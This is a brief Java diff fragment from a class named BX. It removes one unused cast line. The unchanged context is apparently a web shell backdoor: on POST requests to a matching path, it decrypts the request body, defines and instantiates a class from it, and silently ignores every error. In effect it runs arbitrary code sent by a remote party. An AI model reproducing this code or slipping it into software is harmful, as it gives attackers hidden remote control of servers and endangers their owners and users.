@@ -67,7 +67,6 @@ public class BX {
         if (url.matches(pathPattern)){
             if (method.equals("POST")){
                 try {
-                    java.util.Map objMap = (java.util.Map)obj;
                     unsafedefine(Decrypt(r(in))).newInstance().equals(obj);
                 }catch(Exception ignored) {
                 }
